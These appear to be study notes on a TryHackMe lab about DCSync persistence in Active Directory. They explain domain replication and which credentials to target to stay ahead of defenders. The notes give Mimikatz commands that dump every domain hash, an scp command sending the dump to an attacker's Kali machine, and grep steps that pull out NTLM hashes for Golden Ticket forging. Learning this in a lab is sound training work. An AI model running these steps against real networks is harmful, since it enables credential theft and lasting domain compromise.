## DCSync Concept (room theory)

Large orgs run **multiple DCs** across regions (a single DC would delay authentication). To let you authenticate with the same credentials anywhere, DCs use **domain replication**:

- Each DC runs the **Knowledge Consistency Checker (KCC)**, which generates a replication topology and connects to other DCs via **RPC** to synchronize info (new passwords, new users, etc.).
- That sync delay is why you sometimes wait a few minutes after a password change before authenticating.
- Replication is called **DC Synchronisation**. Not only DCs can initiate it — accounts in **Domain Admins** can too (e.g. to create a new DC).

**DCSync attack:** if we control an account with **domain replication permissions**, we can stage a DCSync to harvest credentials from a DC.

### Not All Credentials Are Equal

Always dump privileged (Domain Admins) creds, but those get **rotated first** when the blue team finds you. The goal is to persist with **near-privileged** credentials — enough keys to keep achieving goals and keep the blue team looking over their shoulder. Hunt especially for:

- **Credentials with local admin rights on many machines** (orgs usually have a workstation-admin group and a server-admin group).
- **Service accounts with delegation permissions** — enable forging Golden/Silver tickets for Kerberos delegation attacks.
- **Accounts for privileged AD services** — Exchange, WSUS, SCCM — can be leveraged back into a privileged foothold.
- Hidden privileged relationships can be mapped with **BloodHound**.

For this room: dump **every** credential to maximize the persistence surface — resetting every account in an enterprise domain simultaneously is practically impossible.

### 5. DCSync the entire domain

Relaunch Mimikatz, enable logging, then use `/all` (optionally scope with `/domain:`):

```
log <username>_dcdump.txt
lsadump::dcsync /all
```

```
lsadump::dcsync /domain:za.tryhackme.loc /all
```

This queries and dumps **every** object/account/hash in the domain. It takes a while — close to **10 minutes** to complete. When done, exit Mimikatz to finalize the dump, then download the file.

> *(In the recording, the presenter uses a pre-extracted log `tech_hacker_dcsync.log` to skip the ~10-minute wait. An earlier small log was truncated, so `grep krbtgt` returned nothing until the full file was opened.)*

### 6. Transfer the dump to Kali and extract hashes

Start SSH on Kali, then SCP from the Windows host:

```bash
sudo systemctl start ssh
```

```powershell
scp C:\path\to\file.txt kali@<KALI_IP>:/home/kali/
```

```powershell
scp C:\Tools\mimikatz_trunk\x64\sample2.txt kali@10.150.73.2:/home/kali/Downloads
```

Recover all usernames / hashes from the dump:

```bash
cat <username>_dcdump.txt | grep "SAM Username"
cat <username>_dcdump.txt | grep "Hash NTLM"
```

## Summary

DCSync requires **Domain Admin** rights, lets you dump **all** domain hashes to a log file for persistence across workstations, and is **hard for blue teams to remediate** because you hold credentials for every account. The harvested `krbtgt` hash feeds the next module's Golden Ticket forging.
